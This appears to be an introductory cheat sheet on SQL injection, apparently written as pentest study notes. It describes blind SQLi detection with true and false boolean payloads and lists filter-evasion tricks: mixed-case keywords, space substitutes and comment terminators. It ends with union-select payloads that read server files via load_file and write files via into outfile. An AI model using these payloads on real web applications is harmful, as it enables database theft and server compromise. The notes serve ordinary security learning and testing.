SQLi or SQL injection is a web application vulnerability allows an attacker to bypass logins and extract sensitive data from the database.

## Blind SQLi
Another type of sql injection attack where error does not shown to the user.
### How to indentify blind SQLi:
Test it by making payloads **TRUE**, for eg.:
  `1' and 1 = 1 #` this statement is true and should return the normal data
  `1' and 1 = 2 #` this statement is false and will not return any data without showing any error.

If both payloads work mean site is vulnerable to blind SQLi but not showing error on wrong SQLi pyload.

Examples of TRUE statements for discovering sqli
```
aNd 1=1
aNd 21=21
orDeR bY 1
```

Examples of FALSE statements
```
dNd 0=1
anD 9=2
ordEr bY 1000000000000
```

Characters to use instead of spaces:
```
+, /**/, %20
Examples: orDeR bY 1 can be re-written as
orDer+bY+1
orDer/**/bY/**/1
orDer%20bY%201
```

Comments to end the quries:
```
/*
//
#
%23
```

Ps: sometimes you might need to add ';' before the comment, examples:
```
anD 1=1//
anD 1=1;//
```
#### Reading files:
UniOn selEct 1,load_file('file location') /*

#### Writing files:
UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /*
